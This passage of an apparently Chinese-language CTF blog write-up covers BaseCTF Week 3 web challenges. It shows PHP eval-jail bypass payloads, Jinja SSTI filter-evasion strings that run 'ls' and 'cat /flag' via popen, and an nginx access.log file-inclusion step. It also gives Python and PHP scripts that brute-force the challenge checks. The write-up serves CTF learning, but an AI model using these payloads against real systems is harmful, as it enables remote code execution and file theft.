<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?K=<span class="built_in">DirectoryIterator</span>&amp;W=glob:<span class="comment">///secret/*</span></span><br><span class="line">J=<span class="built_in">SplFileObject</span>&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure>
<h3 id="Week3-ez-php-jail"><a href="#Week3-ez-php-jail" class="headerlink" title="[Week3] ez_php_jail"></a>[Week3] ez_php_jail</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在HTML解析后再输出PHP源代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先先看提交的参数，<code>Jail_by.Happy</code>，这个不是一个合法的参数，所以需要对其合理化,将前面的 _ 替换为[即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
<p>这个就是一个rce，但是这里禁用了很多的东西，可以通过提交 phpinfo(); 来查看信息</p>
<p><img src="https://luokuang1.github.io/images/base4.png" width="95%" height="80%"></p>
<p>这里还禁用了许多的字母和字符，我们就可以通过使用php内置函数来进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;/f*&#x27;</span>));</span><br><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;/f*&#x27;</span>)));<span class="comment">//这里来读取数组里面的内容</span></span><br><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;/f*&#x27;</span>)));</span><br><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;/f*&#x27;</span>)[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="Week3-复读机"><a href="#Week3-复读机" class="headerlink" title="[Week3] 复读机"></a>[Week3] 复读机</h3><p>这里是一个ssti的漏洞</p>
<p>首先需要在开头以BaseCTF，并且禁用了 双大括号 和 __ 还有许多的常见的关键词，比如config,lipsum，还有url_for</p>
<p><img src="https://luokuang1.github.io/images/base5.png" width="95%" height="60%"></p>
<p>这里就需要通过爆破出可以利用的模块,这里尝试通过os，但是发现没有成功，就只能尝试通过其它的模块来执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">137</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/base6.png" width="95%" height="60%"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://challenge.basectf.fun:40577/flag&quot;</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;flag&#x27;</span>:<span class="string">&quot;BaseCTF&#123;%print(&#x27;&#x27;|attr(&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_subcl&#x27;&#x27;asses_&#x27;&#x27;_&#x27;)()|attr(&#x27;_&#x27;&#x27;_getitem_&#x27;&#x27;_&#x27;)(&quot;</span>+<span class="title function_ invoke__">str</span>(i)+<span class="string">&quot;)|attr(&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;)|attr(&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;))%&#125;&quot;</span>&#125;</span><br><span class="line">    res = requests.<span class="title function_ invoke__">post</span>(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;popen&#x27;</span> in res.text:</span><br><span class="line">        <span class="keyword">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#137</span></span><br></pre></td></tr></table></figure>
<p>所以在137这里就有popen，这里就可以通过popen来执行命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_getitem_&#x27;</span><span class="string">&#x27;_&#x27;</span>)(<span class="number">137</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_getit&#x27;</span><span class="string">&#x27;em_&#x27;</span><span class="string">&#x27;_&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;p&#x27;</span><span class="string">&#x27;en&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>))|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;read&#x27;</span>)()))%&#125;<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>最面就是通过rce的绕过，/flag,直接通过python的格式化字符串即可进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_getitem_&#x27;</span><span class="string">&#x27;_&#x27;</span>)(<span class="number">137</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_getit&#x27;</span><span class="string">&#x27;em_&#x27;</span><span class="string">&#x27;_&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;p&#x27;</span><span class="string">&#x27;en&#x27;</span>)(<span class="string">&#x27;cat %c%c%c%c%c&#x27;</span>%(<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>)))|<span class="title function_ invoke__">attr</span>(<span class="string">&#x27;read&#x27;</span>)()))%&#125;<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Week3-滤个不停"><a href="#Week3-滤个不停" class="headerlink" title="[Week3] 滤个不停"></a>[Week3] 滤个不停</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>]; </span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;写出程序员的第一行问候吧！&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//这是个什么东东？？？ </span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]; </span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;此路不通换条路试试?&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件名不合规 请重试&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里是一个文件包含，并且不可以通过伪协议来进行读取，它提示我们需要在提交中包含一些字母</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这里因为不能进行常规的文件包含，所以需要通过包含一些特殊的路径</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/base7.png" width="95%" height="80%"></p>
<p>所以就可以通过在bp里面进行构造</p>
<p><img src="https://luokuang1.github.io/images/base9.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/base8.png" width="95%" height="60%"></p>
<h3 id="Week3-玩原神玩的"><a href="#Week3-玩原神玩的" class="headerlink" title="[Week3] 玩原神玩的"></a>[Week3] 玩原神玩的</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;len&#x27;</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">&quot;我要玩原神&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;可恶的QQ人！😡😡😡&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">&quot;100%&quot;</span> || <span class="variable">$b</span> != <span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) &#123;</span><br><span class="line">    <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里先进行一个代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;len&#x27;</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>) <span class="comment">//这里需要提交的len数组的长度与array长度相同</span></span><br></pre></td></tr></table></figure>
<p>这里通过脚本跑出长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge.basectf.fun:31395/&quot;</span></span><br><span class="line">data=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    key = <span class="string">&quot;len[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>  <span class="comment"># 创建键</span></span><br><span class="line">    data[key] = i</span><br><span class="line">    resp=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;/code&gt;我不管，我要玩原神！😭😭😭&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>然后就是get提交一个tip内容为 我要玩原神</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">&quot;我要玩原神&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里后面就要提交一个m,m的长度为2并且m[0]=100%,m[1]=love100%</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">&quot;100%&quot;</span> || <span class="variable">$b</span> != <span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还是通过脚本来跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge.basectf.fun:31395/?tip=我要玩原神&quot;</span></span><br><span class="line">data=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    key = <span class="string">&quot;len[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>  <span class="comment"># 创建键</span></span><br><span class="line">    data[key] = i</span><br><span class="line">    <span class="comment"># if &quot;&lt;/code&gt;我不管，我要玩原神！😭😭😭&quot; in resp.text:</span></span><br><span class="line">    <span class="comment">#     resp = requests.post(url=url, data=data)</span></span><br><span class="line">    <span class="comment">#     print(resp.text)</span></span><br><span class="line">    <span class="comment">#     print(i)</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">44</span>:</span><br><span class="line">        data[<span class="string">&quot;m[0]&quot;</span>]=<span class="string">&quot;100%&quot;</span></span><br><span class="line">        data[<span class="string">&quot;m[1]&quot;</span>]=<span class="string">&quot;love100%30bd7ce7de206924302499f197c7a966&quot;</span></span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
<p>最后就是通过获取flag里面array，这里array()里面的就是flag了，我们需要对其进行逆操作，首先这里获取了array的长度，取其第ii个元素的ascii码值，异或当前的索引进行异或，再取md5值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) &#123;</span><br><span class="line">  <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就只能看题解来逆操作解码了，$md5_array是json解码的值，然后就可以对其进行逆操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$challenge_url</span> = <span class="string">&quot;http://challenge.basectf.fun:31395/?&quot;</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">45</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$post</span> .= <span class="string">&quot;len[]=&quot;</span> . <span class="variable">$i</span> . <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">&#125; <span class="comment">// $_POST[&#x27;len&#x27;] == sizeof($array)</span></span><br><span class="line"><span class="variable">$get</span> = <span class="string">&quot;tip=&quot;</span> . <span class="string">&quot;我要玩原神&quot;</span>; <span class="comment">// $tip != &quot;我要玩原神&quot;</span></span><br><span class="line"><span class="variable">$post</span> .= <span class="string">&quot;m[]=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;100%&quot;</span>) . <span class="string">&quot;&amp;m[]=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;100%&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span> . <span class="string">&#x27;URL: &#x27;</span> . <span class="variable">$challenge_url</span> . <span class="variable">$get</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;POST Data: &#x27;</span> . <span class="variable">$post</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt_array</span>(<span class="variable">$curl</span>, [</span><br><span class="line">  CURLOPT_URL =&gt; <span class="variable">$challenge_url</span> . <span class="variable">$get</span>,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">  CURLOPT_ENCODING =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; <span class="number">10</span>,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; <span class="variable">$post</span>,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; [</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">  ],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line"><span class="variable">$err</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$curl</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$err</span>) <span class="keyword">die</span>(<span class="string">&#x27;cURL Error #:&#x27;</span> . <span class="variable">$err</span>);</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\[\&quot;(.*?)\&quot;\]/&#x27;</span>, <span class="variable">$response</span>, <span class="variable">$matches</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$matches</span>)) <span class="keyword">die</span>(<span class="string">&quot;Invalid JSON&quot;</span>);</span><br><span class="line"><span class="variable">$json</span> = <span class="string">&#x27;[&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>] . <span class="string">&#x27;&quot;]&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;MD5 Array: &quot;</span> . <span class="variable">$json</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$md5_array</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>; <span class="variable">$ii</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$md5_array</span>); <span class="variable">$ii</span>++) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ascii</span> = <span class="number">0</span>; <span class="variable">$ascii</span> &lt; <span class="number">256</span>; <span class="variable">$ascii</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$ascii</span> ^ <span class="variable">$ii</span>) === <span class="variable">$md5_array</span>[<span class="variable">$ii</span>]) &#123;</span><br><span class="line">      <span class="variable">$flag</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ascii</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Flag: &quot;</span> . <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
